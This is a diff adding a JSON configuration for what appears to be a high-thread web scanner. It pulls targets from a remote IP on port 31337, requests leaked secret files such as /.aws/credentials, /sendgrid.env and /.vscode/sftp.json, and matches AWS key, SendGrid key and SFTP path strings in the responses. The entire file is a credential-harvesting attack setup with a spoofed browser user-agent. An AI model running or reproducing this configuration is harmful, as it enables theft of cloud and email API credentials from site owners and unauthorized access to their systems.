@@ -1,0 +1,22 @@
+{
+  "method": "GET",
+  "statuscode": [
+    200
+  ],
+  "inputUrl": "http://103.191.50.59:31337/jdom/get.php",
+  "threads": 400,
+  "timeout": 3,
+  "paths": [
+    "/.aws/credentials",
+    "/sendgrid.env",
+    "/.vscode/sftp.json"
+  ],
+  "contents": [
+    "aws_access_key_id",
+    "SENDGRID_API_KEY",
+    "\"remotePath\":"
+  ],
+  "regex": [],
+  "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
+  "iterationDelay": 1500
+}
